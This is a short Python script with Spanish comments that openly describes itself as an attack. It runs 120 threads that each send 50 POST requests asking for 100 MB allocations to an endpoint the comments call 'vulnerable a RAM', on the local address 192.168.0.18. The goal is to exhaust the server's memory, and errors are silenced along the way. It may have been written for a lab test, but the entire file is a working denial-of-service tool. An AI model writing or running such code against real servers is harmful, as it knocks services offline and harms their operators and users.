import requests
import threading
import time

# --- CONFIGURACIÓN ---
TARGET_HOST = "192.168.0.18"
TARGET_PORT = 80

# Endpoint vulnerable a RAM
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}/allocations"
CONCURRENCIA = 120
ATAQUES=50

def atacar():
    """
    Función que ejecuta un solo ataque.
    Será ejecutada por cada hilo.
    """
    try:
        # Ponemos un timeout alto porque el servidor se volverá lento
        for _ in range(ATAQUES):
            requests.post(TARGET_URL, timeout=30, data='{"mb":100}')
    
    except Exception as _:
        # Silenciamos otros errores para no saturar la consola
        pass

# --- BUCLE PRINCIPAL ---
print(f"Iniciando ataque CONCURRENTE a {TARGET_URL} con {CONCURRENCIA} hilos.")
start_time = time.time()

# 1. Creamos una lista para guardar los hilos
hilos = []

# 2. Creamos los 50 hilos (pero no los iniciamos aún)
for i in range(CONCURRENCIA):
    hilo = threading.Thread(target=atacar)
    hilos.append(hilo)

# 3. Iniciamos todos los hilos (esto es el ataque)
for hilo in hilos:
    hilo.start()

# 4. Esperamos a que todos los hilos terminen
for hilo in hilos:
    hilo.join()

duration = time.time() - start_time
print(f"\nAtaque masivo completado en {duration:.2f} segundos.")
